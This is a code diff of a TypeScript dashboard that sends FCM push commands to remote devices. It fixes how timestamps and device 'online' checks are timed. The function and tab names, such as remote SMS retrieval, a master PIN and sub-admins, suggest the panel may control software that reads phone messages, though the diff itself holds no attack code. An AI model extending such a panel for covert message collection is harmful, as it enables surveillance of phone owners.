@@ -53,6 +53,7 @@ function generateAppId() {
 function fmtAgo(iso: string | null | undefined): string {
   if (!iso) return "Never";
   const diff = Date.now() - new Date(iso).getTime();
+  if (diff <= 0) return "just now"; // future timestamp / clock skew
   if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
   if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
   if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
@@ -829,6 +830,7 @@ function MessagesTab({ apps, masterPin, syncTick: _syncTick, onOpenDevice }: { a
 function timeAgo(iso: string | null | undefined): string {
   if (!iso) return "—";
   const diff = Date.now() - new Date(iso).getTime();
+  if (diff <= 0) return "just now"; // future timestamp / clock skew
   if (diff < 60000) return "just now";
   if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
   if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
@@ -1165,13 +1167,13 @@ function DeviceActionPanel({ action, device, masterPin, onClose }: { action: Act
   async function fcm(data: Record<string, string>) {
     if (!device.hasFcm) { setLog("No FCM token — device unreachable."); setState("err"); return; }
     if (action === "online_check") {
-      pingActiveRef.current = true; // arm BEFORE sending — sub-admin exact pattern
-      setState("sending"); setLog("");
+      setState("sending"); setLog(""); // counter starts immediately
       try {
         const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data }) });
-        if (!r.ok) { const j = await r.json() as { error?: string }; pingActiveRef.current = false; setLog(j.error ?? "Failed"); setState("err"); }
-        // stays "sending" until WS fires device_updated (pingActiveRef check) or 30s timeout
-      } catch { pingActiveRef.current = false; setLog("Network error"); setState("err"); }
+        if (!r.ok) { const j = await r.json() as { error?: string }; setLog(j.error ?? "Failed"); setState("err"); return; }
+        // FCM delivered — NOW arm WS listener so pre-send heartbeats don't fire false "Online"
+        pingActiveRef.current = true;
+      } catch { setLog("Network error"); setState("err"); }
       return;
     }
     setState("sending"); setLog("Sending…");
@@ -1395,12 +1397,15 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
 
   async function firePing() {
     if (!device.hasFcm) return;
-    pingActiveRef.current = true; // arm BEFORE sending — sub-admin exact pattern
+    // Counter starts immediately — arm flag AFTER FCM send so heartbeats
+    // during the network call don't trigger false "Online" before we sent
     setPingState("sending");
     try {
       const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "0" } }) });
-      if (!r.ok) { pingActiveRef.current = false; setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
-    } catch { pingActiveRef.current = false; setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
+      if (!r.ok) { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); return; }
+      // FCM delivered — NOW arm listener for device WS response
+      pingActiveRef.current = true;
+    } catch { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
   }
 
   async function fireGetSms() {
@@ -1684,13 +1689,14 @@ function CardCheckBtn({ device }: { device: FullDevice }) {
 
   async function handleClick() {
     if (checking) return;
-    activeRef.current = true;
-    setDone(false); setChecking(true);
+    setDone(false); setChecking(true); // counter starts immediately
     try {
       const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "0" } }) });
-      if (!r.ok) { activeRef.current = false; stopTimer(); setChecking(false); setSeconds(0); }
+      if (!r.ok) { stopTimer(); setChecking(false); setSeconds(0); return; }
+      // FCM delivered — NOW arm WS listener so heartbeats before send don't fire
+      activeRef.current = true;
     } catch {
-      activeRef.current = false; stopTimer(); setChecking(false); setSeconds(0);
+      stopTimer(); setChecking(false); setSeconds(0);
     }
   }
 
